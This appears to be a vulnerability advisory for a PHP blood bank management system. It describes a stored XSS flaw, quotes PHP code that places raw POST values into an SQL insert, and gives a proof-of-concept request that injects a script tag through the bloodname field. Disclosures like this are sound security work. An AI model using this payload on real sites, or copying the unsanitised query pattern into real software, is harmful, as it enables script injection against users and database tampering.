# blood-bank-system-in-php-XSS-2

[Blood Bank System In PHP With Source Code - Source Code & Projects (code-projects.org)](https://code-projects.org/blood-bank-system-in-php-with-source-code/)

## NAME OF AFFECTED PRODUCT(S)

**blood-bank-system-in-php**

## Vendor Homepage

https://code-projects.org/blood-bank-system-in-php-with-source-code/

##  **Manufacturers sites**

https://code-projects.org/

# AFFECTED  VERSION(S)

## Vulnerable File

o-.php ，blooddetails.php

## VERSION(S)

-  v1.0

## Software Link

https://download.code-projects.org/details/09f1f26e-072d-4fec-bd3b-974076ee162c

# PROBLEM TYPE

## Vulnerability Type

XSS

## Root Cause

o-.php,blooddetails.php

## Impact

## **Description of the vulnerability**

XSS code can be inserted into the database at the o-php function, and then accessing blood details. php can execute XSS code, causing XSS attacks.

## o-.php

GET the Bloodname parameter and insert it into the database.

```
$Bloodname=$_POST['bloodname'];
$availability=$_POST['Availibility'];
$unit=$_POST['unit'];
$hos=$_POST['hospital'];
$reg="insert into bloodgroup (bloodid, Bloodname, Availibility,unit,hospital) values ('','$Bloodname','$availability','$unit','$hos')";
mysqli_query($con,$reg);
```

## bbms.php	

Retrieve the value of Bloodname and echo the content to the foreground. If blood name is xss code, it will cause code execution.

![image-20240919113541222](https://github.com/user-attachments/assets/433969a7-dc6f-4765-b20e-551fed457f69)



## **Vulnerability recurrence**

### **POC**

Just need to execute the POC and insert the xss code into the database

```
http://bloodbankmgmtsystem/admin/blood/update/o-.php
```

```
bloodname=</td><script>alert("xss2");</script><td>&Availibility=yes&unit=1&hospital=1
```

![image-20240921002639850](https://github.com/user-attachments/assets/7a840b06-4b45-410d-b9d2-9f564c8c7070)

### Result

We can trigger the XSS vulnerability that was just inserted by accessing  blooddetails.php. 

```
http://bloodbankmgmtsystem/blooddetails.php
```

![image-20240921002654301](https://github.com/user-attachments/assets/c8349c75-2734-499e-bdbd-43d0751b3893)